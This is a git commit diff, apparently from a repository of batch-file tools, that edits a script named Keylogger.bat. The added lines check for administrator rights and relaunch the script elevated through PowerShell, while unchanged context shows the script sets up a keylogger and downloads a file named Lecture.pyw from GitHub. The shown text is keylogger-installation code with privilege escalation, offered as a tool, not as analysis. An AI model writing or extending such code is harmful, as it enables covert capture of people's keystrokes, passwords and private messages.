acfc41bc5d9d9c922c89c31e3aba0d8f5cc31f7e
Spy Group <168579723+spy-group@users.noreply.github.com>
2025-03-06 12:18:00 +0500

    Keylogger.bat

--- All Bat Files/Keylogger.bat
+++ All Bat Files/Keylogger.bat
@@ -1,4 +1,12 @@
 @echo off
+REM Check if running as administrator
+net session >nul 2>&1
+if %errorlevel% neq 0 (
+    echo Requesting administrator privileges...
+    powershell -Command "Start-Process '%~f0' -Verb RunAs"
+    exit /b
+)
+
 echo Setting up Keylogger...
 
 REM Step 1: Download Lecture.pyw from GitHub
